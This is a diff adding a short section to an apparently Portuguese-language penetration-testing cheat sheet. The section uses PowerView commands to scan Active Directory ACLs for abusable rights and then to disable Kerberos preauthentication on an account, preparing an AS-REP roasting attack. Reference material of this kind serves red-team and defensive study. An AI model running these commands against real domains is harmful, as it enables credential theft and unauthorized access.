@@ -399,6 +399,17 @@ foreach($result in $MyResults)
   Write-host ""
   }
 ```
+##### KERBEROASTING-ASREP - PESQUISAR PERMISSOES SUSPEITAS
+```
+$FormatEnumerationLimit=-1
+Invoke-ACLScanner -ResolveGUIDs | select ObjectDN,IdentityReferenceName,ActiveDirectoryRights | Out-String -Width 4096
+```
+SE ACHAR, PODE DESABILITAR O KERBEROS PREAUTH MANUALMENTE
+```
+Set-DomainObject -Identity test4 -XOR @{useraccountcontrol=4194304} -Verbose
+```
+
+
 # POWERSHELL
 ## DOWNLOAD
 ##### POWERSHELL - DOWNLOAD AS STRING
